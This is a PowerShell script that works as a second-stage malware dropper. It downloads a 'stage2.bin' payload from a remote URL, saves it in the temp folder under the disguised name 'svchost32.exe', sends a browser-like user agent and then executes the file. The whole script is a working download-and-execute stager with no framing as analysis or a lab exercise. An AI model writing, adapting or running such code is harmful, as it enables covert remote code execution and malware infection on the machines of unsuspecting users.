
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'https://contoso.com/cdn/stage2.bin',
    [string]$LocalPath = "$env:TEMP\svchost32.exe",
    [int]$StageTimeout = 25,
    [string]$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$ResultObject = Invoke-Stage2Download -SourceUrl $RemoteUrl -DestinationPath $LocalPath -TimeoutSec $StageTimeout -UserAgent $BrowserAgent
if ($ResultObject) {
    Start-Process -FilePath $LocalPath
}

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Write-Verbose "stage marker 7 reached"
